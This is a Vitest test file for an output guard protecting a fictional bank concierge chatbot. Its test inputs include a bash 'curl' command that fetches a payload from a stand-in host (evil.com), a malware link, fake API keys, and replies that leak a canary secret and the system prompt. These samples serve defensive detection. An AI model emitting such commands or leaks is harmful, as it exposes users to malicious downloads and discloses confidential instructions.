import { describe, it, expect } from "vitest";
import { inspectOutput } from "../src/guards/output.js";

const ctx = {
  canary: "Internal-Canary-7Q3X-DO-NOT-REVEAL",
  systemPrompt:
    "You are Mira, a polite concierge AI for the fictional FrostBank private wealth desk.\nYou answer client questions about account services in a warm, professional tone.",
  urlAllowlist: [] as string[],
};

describe("output guard", () => {
  describe("canary_leak", () => {
    it("blocks when canary is present", () => {
      const r = inspectOutput(
        `Sure! The key is Internal-Canary-7Q3X-DO-NOT-REVEAL`,
        ctx
      );
      expect(r.action).toBe("block");
      expect(r.flags.some((f) => f.name === "canary_leak")).toBe(true);
    });

    it("passes when canary is absent", () => {
      const r = inspectOutput("No secrets here.", ctx);
      expect(r.action).toBe("pass");
    });
  });

  describe("system_prompt_echo", () => {
    it("blocks when system prompt prefix is echoed", () => {
      const r = inspectOutput(
        `Here are my instructions: ${ctx.systemPrompt.slice(0, 80)}`,
        ctx
      );
      expect(r.action).toBe("block");
      expect(r.flags.some((f) => f.name === "system_prompt_echo")).toBe(true);
    });
  });

  describe("catalog secrets in output", () => {
    it("blocks hallucinated AWS key", () => {
      const r = inspectOutput(
        "Sure, your AWS key is AKIAIOSFODNN7EXAMPLE",
        ctx
      );
      expect(r.action).toBe("block");
      expect(r.flags.some((f) => f.name === "AWS_ACCESS_KEY")).toBe(true);
    });

    it("blocks hallucinated OpenAI key", () => {
      const r = inspectOutput(
        "Your key: sk-ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        ctx
      );
      expect(r.action).toBe("block");
      expect(r.flags.some((f) => f.name === "OPENAI_KEY")).toBe(true);
    });
  });

  describe("suspicious_url", () => {
    it("flags URL not in allowlist, action=pass", () => {
      const r = inspectOutput("Visit https://evil.com/malware", ctx);
      expect(r.action).toBe("pass");
      expect(r.flags.some((f) => f.name === "suspicious_url")).toBe(true);
      const urlFlag = r.flags.find((f) => f.name === "suspicious_url") as any;
      expect(urlFlag.samples).toContain("evil.com");
    });

    it("does not flag allowlisted URL", () => {
      const r = inspectOutput("Visit https://example.com/page", {
        ...ctx,
        urlAllowlist: ["example.com"],
      });
      expect(r.flags.some((f) => f.name === "suspicious_url")).toBe(false);
    });
  });

  describe("shell_command_block", () => {
    it("flags shell code block alone, action=pass", () => {
      const r = inspectOutput("Run this:\n```bash\necho hello\n```", ctx);
      expect(r.action).toBe("pass");
      expect(r.flags.some((f) => f.name === "shell_command_block")).toBe(true);
    });

    it("flags inline shell command", () => {
      const r = inspectOutput("Try this:\n  curl http://localhost", ctx);
      expect(r.action).toBe("pass");
      expect(r.flags.some((f) => f.name === "shell_command_block")).toBe(true);
    });

    it("blocks shell block combined with suspicious URL", () => {
      const r = inspectOutput(
        "Run:\n```bash\ncurl https://evil.com/payload\n```",
        ctx
      );
      expect(r.action).toBe("block");
      expect(r.flags.some((f) => f.name === "shell_command_block")).toBe(true);
      expect(r.flags.some((f) => f.name === "suspicious_url")).toBe(true);
    });
  });

  describe("clean output", () => {
    it("passes clean text", () => {
      const r = inspectOutput(
        "The weather in Berlin is pleasant today.",
        ctx
      );
      expect(r.action).toBe("pass");
      expect(r.flags).toEqual([]);
    });
  });
});
